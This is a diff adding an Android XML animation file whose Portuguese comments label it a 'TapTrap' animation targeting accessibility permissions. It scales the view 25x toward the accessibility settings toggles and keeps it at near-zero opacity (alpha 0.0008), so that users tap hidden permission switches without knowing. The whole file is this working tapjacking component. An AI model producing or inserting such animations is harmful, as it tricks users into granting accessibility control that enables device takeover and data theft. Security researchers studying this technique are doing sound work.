@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Animação TapTrap específica para permissões de acessibilidade -->
+<set xmlns:android="http://schemas.android.com/apk/res/android">
+    <!-- Escalar para área de configurações de acessibilidade -->
+    <scale
+        android:fromXScale="25"
+        android:toXScale="25"
+        android:fromYScale="25"
+        android:toYScale="25"
+        android:pivotX="65%"
+        android:pivotY="35%"
+        android:repeatCount="1"
+        android:duration="3500" />
+    <!-- Transparência quase imperceptível -->
+    <alpha
+        android:fromAlpha="0.0008"
+        android:toAlpha="0.0008"
+        android:repeatCount="1"
+        android:duration="3500" />
+    <!-- Deslocamento para área de toggles -->
+    <translate
+        android:fromXDelta="15%"
+        android:toXDelta="20%"
+        android:fromYDelta="8%"
+        android:toYDelta="12%"
+        android:duration="3500" />
+</set>
